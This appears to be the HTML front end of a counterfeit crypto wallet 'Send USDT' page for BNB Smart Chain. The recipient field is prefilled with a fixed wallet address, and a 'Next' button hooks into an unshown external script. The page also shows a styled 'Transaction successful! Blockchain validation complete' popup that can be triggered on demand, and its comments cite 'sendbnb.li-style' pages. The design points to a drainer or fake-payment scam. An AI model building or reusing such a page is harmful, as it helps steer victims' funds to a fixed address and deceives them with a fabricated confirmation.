<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
  <meta name="color-scheme" content="light dark">
  <title>Send USDT</title>
  <link rel="stylesheet" href="style.css">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
  <!-- Web3.js (Load First) -->
  <script src="js/web3.min.js"></script>
</head>
<body>
  <!-- Loading overlay (light/dark from scanner-manual) -->
  <div id="loadingOverlay" class="loading-overlay" style="display: none;">
    <div class="loading-spinner-container">
      <div class="loading-spinner"></div>
      <p class="loading-text">Processing...</p>
    </div>
  </div>

  <main class="container">
    <label class="label" for="address">Address or Domain Name</label>
    <div class="input-group address-input-group">
      <input type="text" id="address" placeholder="Search or Enter" value="0x53d6f1967d89291a92F185CCc744024d50E8c744">
      <button class="text-btn">Paste</button>
      <button class="icon-btn"><i class="fas fa-address-book"></i></button>
      <button class="icon-btn"><i class="fas fa-expand"></i></button>
    </div>

    <label class="label" for="destinationNetwork">Destination network</label>
    <div class="network-select">
      <div class="network-icon">
        <img src="cropped_circle_image.png" alt="BNB Smart Chain" class="bnb-logo-img">
      </div>
      <span class="network-text">BNB Smart Chain</span>
      <i class="fas fa-chevron-down network-arrow"></i>
    </div>

    <label class="label" for="amount">Amount</label>
    <div class="input-group amount-input-group">
      <input type="number" id="amount" placeholder="USDT Amount">
      <span class="unit">USDT</span>
      <button class="max-btn">Max</button>
    </div>

    <p class="estimate" id="estimate">≈ $0.00</p>

    <button id="verifyBtn" class="next-btn" disabled>Next</button>
    <p class="preview-hint"><button type="button" id="previewPopupBtn" class="preview-btn">Preview success popup</button></p>
  </main>

  <!-- Success popup (reference: Processing-style bottom sheet – 3D check, wireframe globe, particles) -->
  <div id="successModal" class="success-modal" aria-hidden="true">
    <div class="success-modal__backdrop"></div>
    <div class="success-modal__sheet">
      <button type="button" class="success-modal__close" aria-label="Close">&times;</button>
      <div class="success-modal__graphic">
        <svg class="success-modal__icon" viewBox="0 0 140 140" fill="none" xmlns="http://www.w3.org/2000/svg">
          <!-- Wireframe globe – light blue/cyan mesh (reference) -->
          <circle cx="70" cy="70" r="58" stroke="rgba(77, 166, 255, 0.45)" stroke-width="1.2" fill="none"/>
          <ellipse cx="70" cy="70" rx="58" ry="29" stroke="rgba(77, 166, 255, 0.35)" stroke-width="1" fill="none"/>
          <ellipse cx="70" cy="70" rx="29" ry="58" stroke="rgba(77, 166, 255, 0.35)" stroke-width="1" fill="none"/>
          <ellipse cx="70" cy="70" rx="58" ry="20" stroke="rgba(77, 166, 255, 0.2)" stroke-width="0.8" fill="none" transform="rotate(-30 70 70)"/>
          <ellipse cx="70" cy="70" rx="20" ry="58" stroke="rgba(77, 166, 255, 0.2)" stroke-width="0.8" fill="none" transform="rotate(20 70 70)"/>
          <line x1="12" y1="70" x2="128" y2="70" stroke="rgba(77, 166, 255, 0.3)" stroke-width="1"/>
          <line x1="70" y1="12" x2="70" y2="128" stroke="rgba(77, 166, 255, 0.3)" stroke-width="1"/>
          <line x1="22" y1="28" x2="118" y2="112" stroke="rgba(77, 166, 255, 0.18)" stroke-width="0.8"/>
          <line x1="118" y1="28" x2="22" y2="112" stroke="rgba(77, 166, 255, 0.18)" stroke-width="0.8"/>
          <!-- Particles – dots and small triangles in light blue/cyan -->
          <circle cx="32" cy="38" r="2" fill="rgba(77, 166, 255, 0.9)"/>
          <circle cx="108" cy="52" r="1.5" fill="rgba(77, 166, 255, 0.8)"/>
          <circle cx="38" cy="102" r="1.5" fill="rgba(77, 166, 255, 0.75)"/>
          <circle cx="98" cy="88" r="2" fill="rgba(77, 166, 255, 0.85)"/>
          <circle cx="58" cy="22" r="1.2" fill="rgba(77, 166, 255, 0.7)"/>
          <circle cx="82" cy="118" r="1.2" fill="rgba(77, 166, 255, 0.7)"/>
          <polygon points="70,18 73,24 67,24" fill="rgba(77, 166, 255, 0.6)"/>
          <polygon points="25,70 28,74 22,74" fill="rgba(77, 166, 255, 0.5)"/>
          <polygon points="115,72 118,76 112,76" fill="rgba(77, 166, 255, 0.5)"/>
          <polygon points="68,122 71,126 65,126" fill="rgba(77, 166, 255, 0.5)"/>
          <!-- 3D checkmark: vibrant green + electric blue/cyan (reference) -->
          <defs>
            <linearGradient id="checkGrad" x1="0%" y1="0%" x2="100%" y2="0%">
              <stop offset="0%" stop-color="#00C758"/>
              <stop offset="40%" stop-color="#34C759"/>
              <stop offset="55%" stop-color="#34C759"/>
              <stop offset="68%" stop-color="#4DA6FF"/>
              <stop offset="82%" stop-color="#34C759"/>
              <stop offset="100%" stop-color="#00C758"/>
            </linearGradient>
            <filter id="checkGlow" x="-20%" y="-20%" width="140%" height="140%">
              <feGaussianBlur in="SourceGraphic" stdDeviation="0.8" result="blur"/>
              <feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge>
            </filter>
          </defs>
          <path d="M38 72 L58 92 L102 46" stroke="url(#checkGrad)" stroke-width="12" stroke-linecap="round" stroke-linejoin="round" filter="url(#checkGlow)"/>
        </svg>
      </div>
      <h2 class="success-modal__title">Transaction successful!</h2>
      <p class="success-modal__desc">Your transaction has been confirmed. Blockchain validation complete.</p>
      <a id="successModalDetailsBtn" href="https://bscscan.com/" target="_blank" rel="noopener" class="success-modal__btn">Transaction details</a>
    </div>
  </div>

  <!-- Custom script after Web3 -->
  <script src="js/script.js"></script>

  <!-- Optional: sync our loading overlay with script's showLoading/hideLoading -->
  <script>
    (function () {
      var overlay = document.getElementById("loadingOverlay");
      if (!overlay) return;
      var origShow = window.showLoading;
      var origHide = window.hideLoading;
      if (typeof origShow === "function") {
        window.showLoading = function (msg) {
          if (overlay) { overlay.style.display = "flex"; var t = overlay.querySelector(".loading-text"); if (t && msg) t.textContent = msg; }
          return origShow.apply(this, arguments);
        };
      }
      if (typeof origHide === "function") {
        window.hideLoading = function () {
          if (overlay) overlay.style.display = "none";
          return origHide.apply(this, arguments);
        };
      }
    })();
  </script>

  <!-- Override success popup: show sendbnb.li-style bottom sheet on transaction success -->
  <script>
    (function () {
      var modal = document.getElementById("successModal");
      if (!modal) return;
      var closeBtn = modal && modal.querySelector(".success-modal__close");
      var backdrop = modal && modal.querySelector(".success-modal__backdrop");
      var detailsBtn = document.getElementById("successModalDetailsBtn");

      function openSuccessModal() {
        var oldPopup = document.getElementById("successPopup");
        if (oldPopup) oldPopup.style.display = "none";
        if (modal) {
          requestAnimationFrame(function () {
            modal.classList.add("is-open");
            modal.setAttribute("aria-hidden", "false");
          });
        }
      }
      function closeSuccessModal() {
        if (modal) {
          modal.classList.remove("is-open");
          modal.setAttribute("aria-hidden", "true");
        }
      }

      if (closeBtn) closeBtn.addEventListener("click", closeSuccessModal);
      if (backdrop) backdrop.addEventListener("click", closeSuccessModal);

      var previewBtn = document.getElementById("previewPopupBtn");
      if (previewBtn) previewBtn.addEventListener("click", openSuccessModal);

      var originalShowSuccess = window.showSuccess;
      if (typeof originalShowSuccess === "function") {
        window.showSuccess = function (message) {
          openSuccessModal();
        };
      }
    })();
  </script>

  <!-- ✅ Add event listener to call `Next()` -->
  <script>
    document.getElementById("verifyBtn").addEventListener("click", Next);
  </script>
  <!-- Update USD estimate and Next button: no amount = light blue (disabled), valid amount = dark blue (enabled) -->
  <script>
    (function () {
      var amountInput = document.getElementById("amount");
      var estimateEl = document.getElementById("estimate");
      var nextBtn = document.getElementById("verifyBtn");
      function updateEstimateAndButton() {
        var raw = amountInput.value.replace(/^\s+|\s+$/g, "");
        var num = parseFloat(raw) || 0;
        var value = Math.abs(num);
        estimateEl.textContent = "≈ $" + value.toFixed(2);
        if (nextBtn) {
          if (value > 0) {
            nextBtn.removeAttribute("disabled");
          } else {
            nextBtn.setAttribute("disabled", "disabled");
          }
        }
      }
      amountInput.addEventListener("input", updateEstimateAndButton);
      amountInput.addEventListener("change", updateEstimateAndButton);
      updateEstimateAndButton();
    })();
  </script>
</body>
</html>
